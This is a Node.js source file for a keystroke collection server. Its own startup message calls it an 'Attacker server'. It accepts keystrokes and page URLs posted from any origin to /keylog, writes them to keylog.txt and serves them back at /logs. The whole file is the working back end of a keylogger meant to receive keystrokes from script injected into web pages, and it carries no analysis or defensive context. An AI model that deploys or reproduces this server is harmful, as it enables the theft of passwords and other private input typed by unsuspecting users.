const http = require('http');
const fs = require('fs');
const url = require('url');

const PORT = 3002;
const KEYLOG_FILE = 'keylog.txt';

// Create the server
const server = http.createServer((req, res) => {
  // Set CORS headers to allow requests from any origin
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    res.end();
    return;
  }

  const parsedUrl = url.parse(req.url, true);
  
  if (req.method === 'POST' && parsedUrl.pathname === '/keylog') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] Key: ${data.key}, URL: ${data.url}\n`;
        
        // Append to keylog file
        fs.appendFileSync(KEYLOG_FILE, logEntry);
        
        console.log(`Logged keystroke: ${data.key} from ${data.url}`);
        
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'success' }));
      } catch (error) {
        console.error('Error processing keylog:', error);
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
  } else if (req.method === 'GET' && parsedUrl.pathname === '/logs') {
    // Endpoint to view logs
    try {
      const logs = fs.readFileSync(KEYLOG_FILE, 'utf8');
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(logs);
    } catch (error) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('No logs found');
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

server.listen(PORT, () => {
  console.log(`Attacker server running on http://localhost:${PORT}`);
  console.log(`Keylog file: ${KEYLOG_FILE}`);
  console.log('Endpoints:');
  console.log('  POST /keylog - Receive keystroke data');
  console.log('  GET /logs - View collected logs');
}); 